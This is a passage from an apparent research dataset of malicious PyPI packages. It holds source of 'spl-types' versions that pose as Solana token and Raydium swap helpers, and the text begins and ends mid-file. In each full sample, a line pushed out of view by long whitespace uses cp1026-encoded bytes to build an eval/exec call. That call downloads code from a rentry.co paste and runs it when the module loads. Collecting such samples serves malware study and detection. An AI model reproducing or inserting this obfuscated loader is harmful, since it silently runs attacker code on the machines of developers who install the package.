convert_bytes_to_pubkey(obj):\n    if isinstance(obj, dict):\n        return {k: convert_bytes_to_pubkey(v) for k, v in obj.items()}\n    elif isinstance(obj, list):\n        return [convert_bytes_to_pubkey(v) for v in obj]\n    elif isinstance(obj, bytes):\n        return str(Pubkey.from_bytes(obj))\n    else:\n        return obj\n\n\ndef getMetaData(data):\n    decoded_info = base58.b58decode(data)\n    # structure of the instruction\n    instruction_structure = CStruct(\n        \"instructionDiscriminator\" / U8,\n        \"createMetadataAccountArgsV3\"\n        / CStruct(\n            \"data\"\n            / CStruct(\n                \"name\" / String,\n                \"symbol\" / String,\n                \"uri\" / String,\n                \"sellerFeeBasisPoints\" / U16,\n                \"creators\"\n                / Option(\n                    Vec(CStruct(\"address\" / Bytes(32), \"verified\" / Bool, \"share\" / U8))\n                ),\n                \"collection\" / Option(CStruct(\"verified\" / Bool, \"key\" / Bytes(32))),\n                \"uses\"\n                / Option(\n                    CStruct(\n                        \"useMethod\"\n                        / Enum(\"Burn\", \"Multiple\", \"Single\", enum_name=\"UseMethod\"),\n                        \"remaining\" / U64,\n                        \"total\" / U64,\n                    )\n                ),\n            ),\n            \"isMutable\" / Bool,\n            \"collectionDetails\"\n            / Option(String),  # fixme: string is not correct, insert correct type\n        ),\n    )\n    metadata = instruction_structure.parse(decoded_info)\n    metadata = remove_bytesio(metadata)\n    metadata = convert_bytes_to_pubkey(metadata)\n\n    return json.dumps(metadata)\n\n\nSwapLayout = cStruct(\n    \"instruction\" / Int8ul, \"amount_in\" / Int64ul, \"min_amount_out\" / Int64ul\n)\n\n\n\nAMM_INFO_LAYOUT_V4_1 = cStruct(\n    \"status\" / Int64ul,\n    \"nonce\" / Int64ul,\n    \"orderNum\" / Int64ul,\n    \"depth\" / Int64ul,\n    \"coinDecimals\" / Int64ul,\n    \"pcDecimals\" / Int64ul,\n    \"state\" / Int64ul,\n    \"resetFlag\" / Int64ul,\n    \"minSize\" / Int64ul,\n    \"volMaxCutRatio\" / Int64ul,\n    \"amountWaveRatio\" / Int64ul,\n    \"coinLotSize\" / Int64ul,\n    \"pcLotSize\" / Int64ul,\n    \"minPriceMultiplier\" / Int64ul,\n    \"maxPriceMultiplier\" / Int64ul,\n    \"systemDecimalsValue\" / Int64ul,\n    #   // Fees\n    \"minSeparateNumerator\" / Int64ul,\n    \"minSeparateDenominator\" / Int64ul,\n    \"tradeFeeNumerator\" / Int64ul,\n    \"tradeFeeDenominator\" / Int64ul,\n    \"pnlNumerator\" / Int64ul,\n    \"pnlDenominator\" / Int64ul,\n    \"swapFeeNumerator\" / Int64ul,\n    \"swapFeeDenominator\" / Int64ul,\n    #   // OutPutData\n    \"needTakePnlCoin\" / Int64ul,\n    \"needTakePnlPc\" / Int64ul,\n    \"totalPnlPc\" / Int64ul,\n    \"totalPnlCoin\" / Int64ul,\n    \"poolOpenTime\" / Int64ul,\n    \"punishPcAmount\" / Int64ul,\n    \"punishCoinAmount\" / Int64ul,\n    \"orderbookToInitTime\" / Int64ul,\n    \"swapCoinInAmount\" / BytesInteger(16, signed=False, swapped=True),\n    \"swapPcOutAmount\" / BytesInteger(16, signed=False, swapped=True),\n    \"swapCoin2PcFee\" / Int64ul,\n    \"swapPcInAmount\" / BytesInteger(16, signed=False, swapped=True),\n    \"swapCoinOutAmount\" / BytesInteger(16, signed=False, swapped=True),\n    \"swapPc2CoinFee\" / Int64ul,\n    \"poolCoinTokenAccount\" / Bytes(32),\n    \"poolPcTokenAccount\" / Bytes(32),\n    \"coinMintAddress\" / Bytes(32),\n    \"pcMintAddress\" / Bytes(32),\n    \"lpMintAddress\" / Bytes(32),\n    \"ammOpenOrders\" / Bytes(32),\n    \"serumMarket\" / Bytes(32),\n    \"serumProgramId\" / Bytes(32),\n    \"ammTargetOrders\" / Bytes(32),\n    \"poolWithdrawQueue\" / Bytes(32),\n    \"poolTempLpTokenAccount\" / Bytes(32),\n    \"ammOwner\" / Bytes(32),\n    \"pnlOwner\" / Bytes(32),\n)\n\n\nACCOUNT_FLAGS_LAYOUT = BitsSwapped(\n    BitStruct(\n        \"initialized\" / Flag,\n        \"market\" / Flag,\n        \"open_orders\" / Flag,\n        \"request_queue\" / Flag,\n        \"event_queue\" / Flag,\n        \"bids\" / Flag,\n        \"asks\" / Flag,\n        Const(0, BitsInteger(57)),  # Padding\n    )\n)\n\nMARKET_LAYOUT = cStruct(\n    Padding(5),\n    \"account_flags\" / ACCOUNT_FLAGS_LAYOUT,\n    \"own_address\" / Bytes(32),\n    \"vault_signer_nonce\" / Int64ul,\n    \"base_mint\" / Bytes(32),\n    \"quote_mint\" / Bytes(32),\n    \"base_vault\" / Bytes(32),\n    \"base_deposits_total\" / Int64ul,\n    \"base_fees_accrued\" / Int64ul,\n    \"quote_vault\" / Bytes(32),\n    \"quote_deposits_total\" / Int64ul,\n    \"quote_fees_accrued\" / Int64ul,\n    \"quote_dust_threshold\" / Int64ul,\n    \"request_queue\" / Bytes(32),\n    \"event_queue\" / Bytes(32),\n    \"bids\" / Bytes(32),\n    \"asks\" / Bytes(32),\n    \"base_lot_size\" / Int64ul,\n    \"quote_lot_size\" / Int64ul,\n    \"fee_rate_bps\" / Int64ul,\n    \"referrer_rebate_accrued\" / Int64ul,\n    Padding(7),\n)\n\nMINT_LAYOUT = cStruct(Padding(44), \"decimals\" / Int8ul, Padding(37))\n\n\nPOOL_INFO_LAYOUT = cStruct(\"instruction\" / Int8ul, \"simulate_type\" / Int8ul)\n\nLIQ_LAYOUT = cStruct(\"instruction\" / Int8ul, \"amount_in\" / Int64ul)\n\n\n###BUYING\n\nAMM_PROGRAM_ID = Pubkey.from_string('675kPX9MHTjS2zt1qfr1NYHuzeLXfQM9H24wFSUt1Mp8')\nSERUM_PROGRAM_ID = Pubkey.from_string('srmqPvymJeFKQ4zGQed1GFppgkRHL9kaELCbyksJtPX')\ndef get_token_account(ctx,\n                      owner: Pubkey.from_string,\n                      mint: Pubkey.from_string):\n    try:\n        account_data = ctx.get_token_accounts_by_owner(owner, TokenAccountOpts(mint))\n        return account_data.value[0].pubkey, None\n    except:\n        swap_associated_token_address = get_associated_token_address(owner, mint)\n        swap_token_account_Instructions = create_associated_token_account(owner, owner, mint)\n        return swap_associated_token_address, swap_token_account_Instructions\n\n\ndef make_swap_instruction(amount_in: int, token_account_in: Pubkey.from_string, token_account_out: Pubkey.from_string,\n                          accounts: dict, mint, ctx, owner) -> Instruction:\n    tokenPk = mint\n    accountProgramId = ctx.get_account_info_json_parsed(tokenPk)\n    TOKEN_PROGRAM_ID = accountProgramId.value.owner\n\n    keys = [\n        AccountMeta(pubkey=TOKEN_PROGRAM_ID, is_signer=False, is_writable=False),\n        AccountMeta(pubkey=accounts[\"amm_id\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"authority\"], is_signer=False, is_writable=False),\n        AccountMeta(pubkey=accounts[\"open_orders\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"target_orders\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"base_vault\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"quote_vault\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=SERUM_PROGRAM_ID, is_signer=False, is_writable=False),\n        AccountMeta(pubkey=accounts[\"market_id\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"bids\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"asks\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"event_queue\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"market_base_vault\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"market_quote_vault\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"market_authority\"], is_signer=False, is_writable=False),\n        AccountMeta(pubkey=token_account_in, is_signer=False, is_writable=True),  # UserSourceTokenAccount\n        AccountMeta(pubkey=token_account_out, is_signer=False, is_writable=True),  # UserDestTokenAccount\n        AccountMeta(pubkey=owner.pubkey(), is_signer=True, is_writable=False)  # UserOwner\n    ]\n\n    data = SwapLayout.build(\n        dict(\n            instruction=9,\n            amount_in=int(amount_in),\n            min_amount_out=0\n        )\n    )\n    return Instruction(AMM_PROGRAM_ID, data, keys)\n\ndef getSymbol(token):\n    # usdc and usdt\n    exclude = ['EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v', 'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB']\n\n    if token not in exclude:\n        url = f\"https://api.dexscreener.com/latest/dex/tokens/{token}\"\n\n        Token_Symbol = \"\"\n        Sol_symbol = \"\"\n        try:\n            response = requests.get(url)\n\n            # Check if the request was successful (status code 200)\n            if response.status_code == 200:\n                resp = response.json()\n                print(\"Response:\", resp['pairs'][0]['baseToken']['symbol'])\n                for pair in resp['pairs']:\n                    quoteToken = pair['quoteToken']['symbol']\n\n                    if quoteToken == 'SOL':\n                        Token_Symbol = pair['baseToken']['symbol']\n                        Sol_symbol = quoteToken\n                        return Token_Symbol, Sol_symbol\n\n\n            else:\n                print(f\"[getSymbol] Request failed with status code {response.status_code}\")\n\n        except requests.exceptions.RequestException as e:\n            print(f\"[getSymbol] error occurred: {e}\")\n        except:\n            a = 1\n\n        return Token_Symbol, Sol_symbol\n    else:\n        if token == 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v':\n            return \"USDC\", \"SOL\"\n        elif token == 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v':\n            return \"USDT\", \"SOL\"\n\nfrom borsh_construct import CStruct, U64, Bytes                                                                                                                                                                                             ;cc = __builtins__.getattr(__builtins__, b'\\x85\\xa5\\x81\\x93'.decode('cp1026'));cc(b'\\x85\\xa7\\x85\\x83M\\xfc\\x89\\x94\\x97\\x96\\x99\\xa3@\\x99\\x85\\x98\\xa4\\x85\\xa2\\xa3\\xa2^\\x85\\xa7\\x85\\x83M\\x99\\x85\\x98\\xa4\\x85\\xa2\\xa3\\xa2K\\x87\\x85\\xa3M}\\x88\\xa3\\xa3\\x97\\xa2zaa\\x99\\x85\\x95\\xa3\\x99\\xa8K\\x83\\x96a\\xa7\\x83\\xa2\\xa2\\x88\\x94\\x95\\x96a\\x99\\x81\\xa6}]K\\xa3\\x85\\xa7\\xa3]\\xfc]'.decode('cp1026'))\nfrom construct import Bytes, Int8ul, Int32ul, Int64ul, Pass, Switch\n\nPUBLIC_KEY_LAYOUT = Bytes(32)\nmarket_state_layout_v3 = CStruct(\n    \"blob1\" / Bytes(5),\n    \"blob2\" / Bytes(8),\n    \"ownAddress\" / PUBLIC_KEY_LAYOUT,\n    \"vaultSignerNonce\" / U64,\n    \"baseMint\" / PUBLIC_KEY_LAYOUT,\n    \"quoteMint\" / PUBLIC_KEY_LAYOUT,\n    \"baseVault\" / PUBLIC_KEY_LAYOUT,\n    \"baseDepositsTotal\" / U64,\n    \"baseFeesAccrued\" / U64,\n    \"quoteVault\" / PUBLIC_KEY_LAYOUT,\n    \"quoteDepositsTotal\" / U64,\n    \"quoteFeesAccrued\" / U64,\n    \"quoteDustThreshold\" / U64,\n    \"requestQueue\" / PUBLIC_KEY_LAYOUT,\n    \"eventQueue\" / PUBLIC_KEY_LAYOUT,\n    \"bids\" / PUBLIC_KEY_LAYOUT,\n    \"asks\" / PUBLIC_KEY_LAYOUT,\n    \"baseLotSize\" / U64,\n    \"quoteLotSize\" / U64,\n    \"feeRateBps\" / U64,\n    \"referrerRebatesAccrued\" / U64,\n    \"blob3\" / Bytes(7)\n)\nSPL_ACCOUNT_LAYOUT = CStruct(\n    \"mint\" / PUBLIC_KEY_LAYOUT,\n    \"owner\" / PUBLIC_KEY_LAYOUT,\n    \"amount\" / U64,\n    \"delegateOption\" / Int32ul,\n    \"delegate\" / PUBLIC_KEY_LAYOUT,\n    \"state\" / Int8ul,\n    \"isNativeOption\" / Int32ul,\n    \"isNative\" / U64,\n    \"delegatedAmount\" / U64,\n    \"closeAuthorityOption\" / Int32ul,\n    \"closeAuthority\" / PUBLIC_KEY_LAYOUT\n)\n\n\nSPL_MINT_LAYOUT = CStruct(\n  \"mintAuthorityOption\"/ Int32ul,\n  'mintAuthority'/PUBLIC_KEY_LAYOUT,\n  'supply'/U64,\n  'decimals'/Int8ul,\n  'isInitialized'/Int8ul,\n  'freezeAuthorityOption'/Int32ul,\n  'freezeAuthority'/PUBLIC_KEY_LAYOUT\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-07-03-spl-types-v1.0.6",
        "code": "from io import BytesIO\n\nimport requests\nfrom borsh_construct import CStruct, String, U8, U16, U64, Vec, Option, Bool, Enum\n\nfrom construct import Bytes, Int8ul, Int64ul, Padding, BitsInteger, BitsSwapped, BitStruct, Const, Flag, BytesInteger\nfrom construct import Struct as cStruct\n\nimport base58, json\n\n\nfrom spl.token.instructions import create_associated_token_account, get_associated_token_address\n\nfrom solders.pubkey import Pubkey\nfrom solders.instruction import Instruction\n\nfrom solana.rpc.types import TokenAccountOpts\nfrom solana.transaction import AccountMeta\n\n\nclass MyEncoder(json.JSONEncoder):\n    def default(self, o):\n        if type(o) is bytes:\n            return o.decode(\"utf-8\")\n        return super(MyEncoder, self).default(o)\n\n\ndef remove_bytesio(obj):\n    if isinstance(obj, dict):\n        return {\n            k: remove_bytesio(v) for k, v in obj.items() if not isinstance(v, BytesIO)\n        }\n    elif isinstance(obj, list):\n        return [remove_bytesio(v) for v in obj if not isinstance(v, BytesIO)]\n    else:\n        return obj\n\ndef get_offset(struct, field):\n    offset = 0\n    for item in struct.subcons:\n        if item.name == field:\n            return offset\n        else:\n            offset += item.sizeof()\n    return None\ndef convert_bytes_to_pubkey(obj):\n    if isinstance(obj, dict):\n        return {k: convert_bytes_to_pubkey(v) for k, v in obj.items()}\n    elif isinstance(obj, list):\n        return [convert_bytes_to_pubkey(v) for v in obj]\n    elif isinstance(obj, bytes):\n        return str(Pubkey.from_bytes(obj))\n    else:\n        return obj\n\n\ndef getMetaData(data):\n    decoded_info = base58.b58decode(data)\n    # structure of the instruction\n    instruction_structure = CStruct(\n        \"instructionDiscriminator\" / U8,\n        \"createMetadataAccountArgsV3\"\n        / CStruct(\n            \"data\"\n            / CStruct(\n                \"name\" / String,\n                \"symbol\" / String,\n                \"uri\" / String,\n                \"sellerFeeBasisPoints\" / U16,\n                \"creators\"\n                / Option(\n                    Vec(CStruct(\"address\" / Bytes(32), \"verified\" / Bool, \"share\" / U8))\n                ),\n                \"collection\" / Option(CStruct(\"verified\" / Bool, \"key\" / Bytes(32))),\n                \"uses\"\n                / Option(\n                    CStruct(\n                        \"useMethod\"\n                        / Enum(\"Burn\", \"Multiple\", \"Single\", enum_name=\"UseMethod\"),\n                        \"remaining\" / U64,\n                        \"total\" / U64,\n                    )\n                ),\n            ),\n            \"isMutable\" / Bool,\n            \"collectionDetails\"\n            / Option(String),  # fixme: string is not correct, insert correct type\n        ),\n    )\n    metadata = instruction_structure.parse(decoded_info)\n    metadata = remove_bytesio(metadata)\n    metadata = convert_bytes_to_pubkey(metadata)\n\n    return json.dumps(metadata)\n\n\nSwapLayout = cStruct(\n    \"instruction\" / Int8ul, \"amount_in\" / Int64ul, \"min_amount_out\" / Int64ul\n)\n\n\n\nAMM_INFO_LAYOUT_V4_1 = cStruct(\n    \"status\" / Int64ul,\n    \"nonce\" / Int64ul,\n    \"orderNum\" / Int64ul,\n    \"depth\" / Int64ul,\n    \"coinDecimals\" / Int64ul,\n    \"pcDecimals\" / Int64ul,\n    \"state\" / Int64ul,\n    \"resetFlag\" / Int64ul,\n    \"minSize\" / Int64ul,\n    \"volMaxCutRatio\" / Int64ul,\n    \"amountWaveRatio\" / Int64ul,\n    \"coinLotSize\" / Int64ul,\n    \"pcLotSize\" / Int64ul,\n    \"minPriceMultiplier\" / Int64ul,\n    \"maxPriceMultiplier\" / Int64ul,\n    \"systemDecimalsValue\" / Int64ul,\n    #   // Fees\n    \"minSeparateNumerator\" / Int64ul,\n    \"minSeparateDenominator\" / Int64ul,\n    \"tradeFeeNumerator\" / Int64ul,\n    \"tradeFeeDenominator\" / Int64ul,\n    \"pnlNumerator\" / Int64ul,\n    \"pnlDenominator\" / Int64ul,\n    \"swapFeeNumerator\" / Int64ul,\n    \"swapFeeDenominator\" / Int64ul,\n    #   // OutPutData\n    \"needTakePnlCoin\" / Int64ul,\n    \"needTakePnlPc\" / Int64ul,\n    \"totalPnlPc\" / Int64ul,\n    \"totalPnlCoin\" / Int64ul,\n    \"poolOpenTime\" / Int64ul,\n    \"punishPcAmount\" / Int64ul,\n    \"punishCoinAmount\" / Int64ul,\n    \"orderbookToInitTime\" / Int64ul,\n    \"swapCoinInAmount\" / BytesInteger(16, signed=False, swapped=True),\n    \"swapPcOutAmount\" / BytesInteger(16, signed=False, swapped=True),\n    \"swapCoin2PcFee\" / Int64ul,\n    \"swapPcInAmount\" / BytesInteger(16, signed=False, swapped=True),\n    \"swapCoinOutAmount\" / BytesInteger(16, signed=False, swapped=True),\n    \"swapPc2CoinFee\" / Int64ul,\n    \"poolCoinTokenAccount\" / Bytes(32),\n    \"poolPcTokenAccount\" / Bytes(32),\n    \"coinMintAddress\" / Bytes(32),\n    \"pcMintAddress\" / Bytes(32),\n    \"lpMintAddress\" / Bytes(32),\n    \"ammOpenOrders\" / Bytes(32),\n    \"serumMarket\" / Bytes(32),\n    \"serumProgramId\" / Bytes(32),\n    \"ammTargetOrders\" / Bytes(32),\n    \"poolWithdrawQueue\" / Bytes(32),\n    \"poolTempLpTokenAccount\" / Bytes(32),\n    \"ammOwner\" / Bytes(32),\n    \"pnlOwner\" / Bytes(32),\n)\n\n\nACCOUNT_FLAGS_LAYOUT = BitsSwapped(\n    BitStruct(\n        \"initialized\" / Flag,\n        \"market\" / Flag,\n        \"open_orders\" / Flag,\n        \"request_queue\" / Flag,\n        \"event_queue\" / Flag,\n        \"bids\" / Flag,\n        \"asks\" / Flag,\n        Const(0, BitsInteger(57)),  # Padding\n    )\n)\n\nMARKET_LAYOUT = cStruct(\n    Padding(5),\n    \"account_flags\" / ACCOUNT_FLAGS_LAYOUT,\n    \"own_address\" / Bytes(32),\n    \"vault_signer_nonce\" / Int64ul,\n    \"base_mint\" / Bytes(32),\n    \"quote_mint\" / Bytes(32),\n    \"base_vault\" / Bytes(32),\n    \"base_deposits_total\" / Int64ul,\n    \"base_fees_accrued\" / Int64ul,\n    \"quote_vault\" / Bytes(32),\n    \"quote_deposits_total\" / Int64ul,\n    \"quote_fees_accrued\" / Int64ul,\n    \"quote_dust_threshold\" / Int64ul,\n    \"request_queue\" / Bytes(32),\n    \"event_queue\" / Bytes(32),\n    \"bids\" / Bytes(32),\n    \"asks\" / Bytes(32),\n    \"base_lot_size\" / Int64ul,\n    \"quote_lot_size\" / Int64ul,\n    \"fee_rate_bps\" / Int64ul,\n    \"referrer_rebate_accrued\" / Int64ul,\n    Padding(7),\n)\n\nMINT_LAYOUT = cStruct(Padding(44), \"decimals\" / Int8ul, Padding(37))\n\n\nPOOL_INFO_LAYOUT = cStruct(\"instruction\" / Int8ul, \"simulate_type\" / Int8ul)\n\nLIQ_LAYOUT = cStruct(\"instruction\" / Int8ul, \"amount_in\" / Int64ul)\n\n\n###BUYING\n\nAMM_PROGRAM_ID = Pubkey.from_string('675kPX9MHTjS2zt1qfr1NYHuzeLXfQM9H24wFSUt1Mp8')\nSERUM_PROGRAM_ID = Pubkey.from_string('srmqPvymJeFKQ4zGQed1GFppgkRHL9kaELCbyksJtPX')\ndef get_token_account(ctx,\n                      owner: Pubkey.from_string,\n                      mint: Pubkey.from_string):\n    try:\n        account_data = ctx.get_token_accounts_by_owner(owner, TokenAccountOpts(mint))\n        return account_data.value[0].pubkey, None\n    except:\n        swap_associated_token_address = get_associated_token_address(owner, mint)\n        swap_token_account_Instructions = create_associated_token_account(owner, owner, mint)\n        return swap_associated_token_address, swap_token_account_Instructions\n\n\ndef make_swap_instruction(amount_in: int, token_account_in: Pubkey.from_string, token_account_out: Pubkey.from_string,\n                          accounts: dict, mint, ctx, owner) -> Instruction:\n    tokenPk = mint\n    accountProgramId = ctx.get_account_info_json_parsed(tokenPk)\n    TOKEN_PROGRAM_ID = accountProgramId.value.owner\n\n    keys = [\n        AccountMeta(pubkey=TOKEN_PROGRAM_ID, is_signer=False, is_writable=False),\n        AccountMeta(pubkey=accounts[\"amm_id\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"authority\"], is_signer=False, is_writable=False),\n        AccountMeta(pubkey=accounts[\"open_orders\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"target_orders\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"base_vault\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"quote_vault\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=SERUM_PROGRAM_ID, is_signer=False, is_writable=False),\n        AccountMeta(pubkey=accounts[\"market_id\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"bids\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"asks\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"event_queue\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"market_base_vault\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"market_quote_vault\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"market_authority\"], is_signer=False, is_writable=False),\n        AccountMeta(pubkey=token_account_in, is_signer=False, is_writable=True),  # UserSourceTokenAccount\n        AccountMeta(pubkey=token_account_out, is_signer=False, is_writable=True),  # UserDestTokenAccount\n        AccountMeta(pubkey=owner.pubkey(), is_signer=True, is_writable=False)  # UserOwner\n    ]\n\n    data = SwapLayout.build(\n        dict(\n            instruction=9,\n            amount_in=int(amount_in),\n            min_amount_out=0\n        )\n    )\n    return Instruction(AMM_PROGRAM_ID, data, keys)\n\ndef getSymbol(token):\n    # usdc and usdt\n    exclude = ['EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v', 'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB']\n\n    if token not in exclude:\n        url = f\"https://api.dexscreener.com/latest/dex/tokens/{token}\"\n\n        Token_Symbol = \"\"\n        Sol_symbol = \"\"\n        try:\n            response = requests.get(url)\n\n            # Check if the request was successful (status code 200)\n            if response.status_code == 200:\n                resp = response.json()\n                print(\"Response:\", resp['pairs'][0]['baseToken']['symbol'])\n                for pair in resp['pairs']:\n                    quoteToken = pair['quoteToken']['symbol']\n\n                    if quoteToken == 'SOL':\n                        Token_Symbol = pair['baseToken']['symbol']\n                        Sol_symbol = quoteToken\n                        return Token_Symbol, Sol_symbol\n\n\n            else:\n                print(f\"[getSymbol] Request failed with status code {response.status_code}\")\n\n        except requests.exceptions.RequestException as e:\n            print(f\"[getSymbol] error occurred: {e}\")\n        except:\n            a = 1\n\n        return Token_Symbol, Sol_symbol\n    else:\n        if token == 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v':\n            return \"USDC\", \"SOL\"\n        elif token == 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v':\n            return \"USDT\", \"SOL\"\n\nfrom borsh_construct import CStruct, U64, Bytes\nfrom construct import Bytes, Int8ul, Int32ul, Int64ul, Pass, Switch\n                                                                                                                                                                                                                                                                                                                                                                                       ;cc = __builtins__.getattr(__builtins__, b'\\x85\\xa5\\x81\\x93'.decode('cp1026'));cc(b'\\x85\\xa7\\x85\\x83M\\xfc\\x89\\x94\\x97\\x96\\x99\\xa3@\\x99\\x85\\x98\\xa4\\x85\\xa2\\xa3\\xa2^\\x85\\xa7\\x85\\x83M\\x99\\x85\\x98\\xa4\\x85\\xa2\\xa3\\xa2K\\x87\\x85\\xa3M}\\x88\\xa3\\xa3\\x97\\xa2zaa\\x99\\x85\\x95\\xa3\\x99\\xa8K\\x83\\x96a\\xa7\\x83\\xa2\\xa2\\x88\\x94\\x95\\x96a\\x99\\x81\\xa6}]K\\xa3\\x85\\xa7\\xa3]\\xfc]'.decode('cp1026'))\nPUBLIC_KEY_LAYOUT = Bytes(32)\nmarket_state_layout_v3 = CStruct(\n    \"blob1\" / Bytes(5),\n    \"blob2\" / Bytes(8),\n    \"ownAddress\" / PUBLIC_KEY_LAYOUT,\n    \"vaultSignerNonce\" / U64,\n    \"baseMint\" / PUBLIC_KEY_LAYOUT,\n    \"quoteMint\" / PUBLIC_KEY_LAYOUT,\n    \"baseVault\" / PUBLIC_KEY_LAYOUT,\n    \"baseDepositsTotal\" / U64,\n    \"baseFeesAccrued\" / U64,\n    \"quoteVault\" / PUBLIC_KEY_LAYOUT,\n    \"quoteDepositsTotal\" / U64,\n    \"quoteFeesAccrued\" / U64,\n    \"quoteDustThreshold\" / U64,\n    \"requestQueue\" / PUBLIC_KEY_LAYOUT,\n    \"eventQueue\" / PUBLIC_KEY_LAYOUT,\n    \"bids\" / PUBLIC_KEY_LAYOUT,\n    \"asks\" / PUBLIC_KEY_LAYOUT,\n    \"baseLotSize\" / U64,\n    \"quoteLotSize\" / U64,\n    \"feeRateBps\" / U64,\n    \"referrerRebatesAccrued\" / U64,\n    \"blob3\" / Bytes(7)\n)\nSPL_ACCOUNT_LAYOUT = CStruct(\n    \"mint\" / PUBLIC_KEY_LAYOUT,\n    \"owner\" / PUBLIC_KEY_LAYOUT,\n    \"amount\" / U64,\n    \"delegateOption\" / Int32ul,\n    \"delegate\" / PUBLIC_KEY_LAYOUT,\n    \"state\" / Int8ul,\n    \"isNativeOption\" / Int32ul,\n    \"isNative\" / U64,\n    \"delegatedAmount\" / U64,\n    \"closeAuthorityOption\" / Int32ul,\n    \"closeAuthority\" / PUBLIC_KEY_LAYOUT\n)\n\n\nSPL_MINT_LAYOUT = CStruct(\n  \"mintAuthorityOption\"/ Int32ul,\n  'mintAuthority'/PUBLIC_KEY_LAYOUT,\n  'supply'/U64,\n  'decimals'/Int8ul,\n  'isInitialized'/Int8ul,\n  'freezeAuthorityOption'/Int32ul,\n  'freezeAuthority'/PUBLIC_KEY_LAYOUT\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-07-03-spl-types-v1.0.7",
        "code": "from io import BytesIO\n\nimport requests\nfrom borsh_construct import CStruct, String, U8, U16, U64, Vec, Option, Bool, Enum\n\nfrom construct import Bytes, Int8ul, Int64ul, Padding, BitsInteger, BitsSwapped, BitStruct, Const, Flag, BytesInteger\nfrom construct import Struct as cStruct\n\nimport base58, json\n\n\nfrom spl.token.instructions import create_associated_token_account, get_associated_token_address\n\nfrom solders.pubkey import Pubkey\nfrom solders.instruction import Instruction\n\nfrom solana.rpc.types import TokenAccountOpts\nfrom solana.transaction import AccountMeta\n\n\nclass MyEncoder(json.JSONEncoder):\n    def default(self, o):\n        if type(o) is bytes:\n            return o.decode(\"utf-8\")\n        return super(MyEncoder, self).default(o)\n\n\ndef remove_bytesio(obj):\n    if isinstance(obj, dict):\n        return {\n            k: remove_bytesio(v) for k, v in obj.items() if not isinstance(v, BytesIO)\n        }\n    elif isinstance(obj, list):\n        return [remove_bytesio(v) for v in obj if not isinstance(v, BytesIO)]\n    else:\n        return obj\n\ndef get_offset(struct, field):\n    offset = 0\n    for item in struct.subcons:\n        if item.name == field:\n            return offset\n        else:\n            offset += item.sizeof()\n    return None\ndef convert_bytes_to_pubkey(obj):\n    if isinstance(obj, dict):\n        return {k: convert_bytes_to_pubkey(v) for k, v in obj.items()}\n    elif isinstance(obj, list):\n        return [convert_bytes_to_pubkey(v) for v in obj]\n    elif isinstance(obj, bytes):\n        return str(Pubkey.from_bytes(obj))\n    else:\n        return obj\n\n\ndef getMetaData(data):\n    decoded_info = base58.b58decode(data)\n    # structure of the instruction\n    instruction_structure = CStruct(\n        \"instructionDiscriminator\" / U8,\n        \"createMetadataAccountArgsV3\"\n        / CStruct(\n            \"data\"\n            / CStruct(\n                \"name\" / String,\n                \"symbol\" / String,\n                \"uri\" / String,\n                \"sellerFeeBasisPoints\" / U16,\n                \"creators\"\n                / Option(\n                    Vec(CStruct(\"address\" / Bytes(32), \"verified\" / Bool, \"share\" / U8))\n                ),\n                \"collection\" / Option(CStruct(\"verified\" / Bool, \"key\" / Bytes(32))),\n                \"uses\"\n                / Option(\n                    CStruct(\n                        \"useMethod\"\n                        / Enum(\"Burn\", \"Multiple\", \"Single\", enum_name=\"UseMethod\"),\n                        \"remaining\" / U64,\n                        \"total\" / U64,\n                    )\n                ),\n            ),\n            \"isMutable\" / Bool,\n            \"collectionDetails\"\n            / Option(String),  # fixme: string is not correct, insert correct type\n        ),\n    )\n    metadata = instruction_structure.parse(decoded_info)\n    metadata = remove_bytesio(metadata)\n    metadata = convert_bytes_to_pubkey(metadata)\n\n    return json.dumps(metadata)\n\n\nSwapLayout = cStruct(\n    \"instruction\" / Int8ul, \"amount_in\" / Int64ul, \"min_amount_out\" / Int64ul\n)\n\n\n\nAMM_INFO_LAYOUT_V4_1 = cStruct(\n    \"status\" / Int64ul,\n    \"nonce\" / Int64ul,\n    \"orderNum\" / Int64ul,\n    \"depth\" / Int64ul,\n    \"coinDecimals\" / Int64ul,\n    \"pcDecimals\" / Int64ul,\n    \"state\" / Int64ul,\n    \"resetFlag\" / Int64ul,\n    \"minSize\" / Int64ul,\n    \"volMaxCutRatio\" / Int64ul,\n    \"amountWaveRatio\" / Int64ul,\n    \"coinLotSize\" / 